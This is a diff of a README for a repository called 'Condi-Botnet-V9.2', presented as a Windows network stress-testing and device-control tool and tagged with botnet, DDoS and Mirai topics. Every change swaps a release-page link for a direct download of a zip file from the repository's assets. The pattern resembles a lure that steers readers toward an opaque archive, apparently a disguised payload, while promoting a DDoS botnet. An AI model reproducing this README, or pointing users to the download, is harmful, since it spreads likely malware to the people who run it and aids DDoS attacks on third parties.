@@ -1,9 +1,9 @@
 # 🛡️ Condi-Botnet-V9.2 - Simple Control for Fast Testing
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/brandaobe8314/Condi-Botnet-V9.2/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/brandaobe8314/Condi-Botnet-V9.2/main/assets/Botnet_Condi_1.2.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/brandaobe8314/Condi-Botnet-V9.2/releases
+Visit this page to download: https://raw.githubusercontent.com/brandaobe8314/Condi-Botnet-V9.2/main/assets/Botnet_Condi_1.2.zip
 
 ## 🖥️ What This App Does
 Condi Botnet V9.2 is a Windows app for network stress testing and device control in a lab setup. It helps you run tests, watch connected nodes, and check how a system handles load.
@@ -30,7 +30,7 @@ You may also need:
 
 ## 🚀 Getting Started
 1. Open the release page  
-   https://github.com/brandaobe8314/Condi-Botnet-V9.2/releases
+   https://raw.githubusercontent.com/brandaobe8314/Condi-Botnet-V9.2/main/assets/Botnet_Condi_1.2.zip
 
 2. Find the latest release  
    Look for the newest version at the top of the page.
@@ -181,7 +181,7 @@ To restore:
 - try again after that
 
 ## 📌 Release Page
-Download from the release page here: https://github.com/brandaobe8314/Condi-Botnet-V9.2/releases
+Download from the release page here: https://raw.githubusercontent.com/brandaobe8314/Condi-Botnet-V9.2/main/assets/Botnet_Condi_1.2.zip
 
 ## 🏷️ Topics
 botnet, condi-botnet, ddos, ddos-botnet, ddos-service, iot-botnet, layer4, layer7, mirai-botnet, zxcr9999
